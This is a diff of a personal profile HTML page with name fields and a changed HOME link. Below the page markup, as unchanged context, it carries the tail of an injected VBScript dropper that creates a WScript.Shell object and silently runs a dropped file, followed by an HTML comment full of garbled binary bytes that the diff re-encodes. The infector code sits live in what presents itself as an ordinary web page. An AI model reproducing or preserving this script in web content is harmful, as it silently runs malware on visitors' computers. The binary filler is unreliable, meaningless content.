@@ -13,7 +13,7 @@ body{
 <body>
 <h1>JENIVA DELFIN</h1>
 <center><img src="jenivaP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<p><a href="content.php" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>JENIVA</p>
 <p><front = 'Georgia'><b>Middle Name:</b>ABALLAR</p>
@@ -40,5 +40,8 @@ End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
 //--></SCRIPT><!--s!
-�G����4�2����� ӟ��hЉ�c�y�Z<�%��,����E���W��5�5}��7ځ�o�
-�Zr�x �i�����Ҋ�ot���26x�J3J�,(� ���!pmЛu�H���VW^���/��&��oa�*�3c�6�����'�lF`n�'!��>b3;hK�Q�rD�'�_�̼",����w��G׼�Ӄ� ��	zm4�E��"�|�9U\�����y�)�L[6	���\��?�+6��+����m���ì�P�ڒ�ZW�-CAC碢c��:=� ��R(���������N�X3�� ��-->
+ÃGúÌË4Ê2ôýâêÅ ÓÏç¹hÐÌcÕyéZ<«%ÜÚ,èÑÔÐEß¤¨WÏ¦55}Ñ7Úoè
+ÑZräx þi¦ü¤àäÒ©otå¥2
+6xªJ3J,(í £ûÛ!pmÐu²H¿ê
+²VW^éçê/þå&öÍoa¤*ð3c6¡'lF`nò'!>b3;hKë¼QürD£'_ÍÌ¼",ª£w¡ìG×¼Ó® ð§	zm4¬EÑ
+"À|µ9U\ùãáÅyÇ)L[6	¶É\¥Ï?°+6+Ë mîÃ¬îªPîÚZWþ-CACç¢¢cò:= ëÎR(ÕøëÎëÎëÎ¦N·X3èÎ ëÎ-->
